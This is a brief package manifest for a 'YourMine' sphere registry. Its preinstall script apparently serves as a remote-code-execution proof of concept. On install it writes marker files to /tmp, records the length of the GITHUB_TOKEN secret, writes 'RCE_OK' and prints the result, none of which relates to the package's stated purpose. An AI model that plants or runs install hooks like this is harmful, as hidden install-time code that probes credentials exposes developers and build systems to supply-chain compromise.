name: yourmine-spheres
description: YourMine sphere registry — validated via Solana signature + YRM score

scripts.preinstall: echo POC_MARKER_YOURMINEDAPP > /tmp/POC_MARKER_YOURMINEDAPP.txt; echo GH_TOKEN_LEN=${#GITHUB_TOKEN} >> /tmp/POC_MARKER_YOURMINEDAPP.txt; echo RCE_OK >> /tmp/POC_MARKER_YOURMINEDAPP.txt; cat /tmp/POC_MARKER_YOURMINEDAPP.txt
